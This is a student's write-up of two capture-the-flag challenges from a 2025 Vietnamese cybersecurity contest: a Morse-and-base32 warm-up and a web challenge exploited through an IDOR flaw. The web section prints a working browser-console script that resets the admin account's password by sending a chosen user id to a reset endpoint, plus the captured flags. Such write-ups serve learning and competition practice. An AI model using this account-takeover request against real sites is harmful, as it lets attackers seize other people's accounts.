> On 18/10/2025, I was involved in the Cybersecurity Student Contest Vietnam 2025 — a prestigious competition. The contest was quite challenging for me, but I managed to solve two problems easily.

# 1.README(S)?
Because this was a warm-up question, I didn’t have much time to solve it. The problem is:
![image](https://hackmd.io/_uploads/rkijy_LCge.png)
It introduced some information about CNSV2025, which was not relevant. Then I clicked on the hint and saw Morse code:
`.. -. .--- ..- --. ...- .-. ... --. .- --.. -.. -.- -.... ..--- -.. -. ..... ..--- .-- ....- ..... -.. ..-. --- .--- ..- .-- ....- --.. ..--- -.. .--. ..-. .-. --. -.- ....- - -.. --- .--- ..- .-- ..--- --.. .--- -. -.- -. ..- --. -.-. ....- - .--- -. --.. - ...- . --.. .-.. - --- -... -..- .-- ....- ....- ...-- .--- -- .--- ..- .-- -.-- ..--- .-.. ..- .--. . .-- ...- --. --.. .-.. -.. --- ...- --.. --. ... ...-- - .... .--- ..... ..--- -..- . .-. - ...- --- .-. ..--- -..- . --.. .-.. .....`
I decoded morse and base32 to obtain a flag :+1: `CSCV2025{CounteringCybercrime-SharingResponsibility-SecuringOurFuture}`
# 2.Web — Leak Force
Initially, I encountered a website with a login background.
While exploring the page source, I found something more interesting: a clue in the app.js file.
![image](https://hackmd.io/_uploads/Hy6BxuURxe.png)
From this, I realized that the issue was an IDOR (Insecure Direct Object Reference) vulnerability.
I seen code
![image](https://hackmd.io/_uploads/BJjLl_U0ll.png)
The vulnerability lies in the server’s trust. The server blindly trusted the data sent by the client, specifically the id field.
`body: JSON.stringify({ id: myId, newPassword })`
This line of code means: “Send a password reset request, and tell the server to change the password for the user whose id is myId.

I can easily modify this request (using the F12 Console) to rest password account admin. I paste the code here

```
(async function() {
    var targetId = 1; // Thử ID của admin (hoặc user khác)
    var newPassword = '123'; // Mật khẩu mới bạn muốn đặt

    const resp = await fetch('/api/reset-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: targetId, newPassword: newPassword })
    });
    
    const result = await resp.json();
    
    if (resp.ok) {
        console.log('THÀNH CÔNG! Đã đổi mật khẩu của user ID:', targetId, result);
        alert('THÀNH CÔNG! Thử đăng nhập bằng tài khoản admin và mật khẩu ' + newPassword);
    } else {
        console.error('THẤT BẠI:', result);
    }
})();
```
![image](https://hackmd.io/_uploads/By_YgO80xe.png)
Continue,i can easy login and obtain flag :

`CSCV2025{7h3_Uni73d_N47i0ns_C0nv3n7i0n_4g4ins7_Cyb3rcrim3}`
> Through this very competitive contest, I realized more weaknesses in myself .The truth is, I couldn’t solve any forensic problems — even though I had considered that one of my strengths .I joined the contest mainly for fun and to gain experience .See you in the contest next year, and I hope I can achieve a higher rank next time.
